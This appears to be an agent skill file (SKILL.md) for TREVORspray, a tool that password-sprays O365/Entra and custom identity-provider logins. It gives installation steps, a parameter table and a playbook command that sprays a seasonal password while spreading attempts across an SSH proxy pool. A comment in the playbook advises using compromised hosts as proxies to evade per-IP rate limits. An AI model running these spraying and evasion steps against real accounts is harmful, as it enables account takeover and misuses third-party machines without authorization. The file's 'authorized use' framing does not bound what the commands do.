---
name: trevorspray-cloud-spray
description: "TREVORspray performs proxy-pool O365 spraying. Signals: password cracking, hash cracking, custom IdP, SSH proxy-pool spraying, threads"
zh-signals: "TREVORspray: 代理池 O365 喷洒。信号:密码破解,哈希破解,自定义 IdP,SSH 代理池喷洒,线程。"
when-to-use: >-
  Use when conducting authorized password spraying against O365/Entra or a
  custom IdP and you want to route attempts through an SSH proxy pool to avoid
  per-IP lockouts.
---

# TREVORspray

- Attack Category: C25 Password and Hash Cracking
- Upstream Repository: https://github.com/blacklanternsecurity/TREVORspray
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install trevorspray
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `trevorspray --emails users.txt --passwords pass.txt` | O365 spraying |
| `--url https://login.target.com --usernames u.txt` | Custom IdP |
| `--ssh hosts.txt --key id_rsa` | SSH proxy pool spraying |
| `-t 100` | Threads |
| `--lockout-threshold 3` | Account lockout protection |

## Attack Scenario Playbook

### Proxy-pool O365 spraying

```bash
trevorspray --emails emails.txt --passwords Winter2024! --lockout-threshold 3
# Use compromised hosts as proxies (--ssh) to evade per-IP rate limits
```

## Notes

By Black Lantern; sprays O365/Entra and all kinds of IdPs, with a built-in proxy pool and smart lockout evasion.
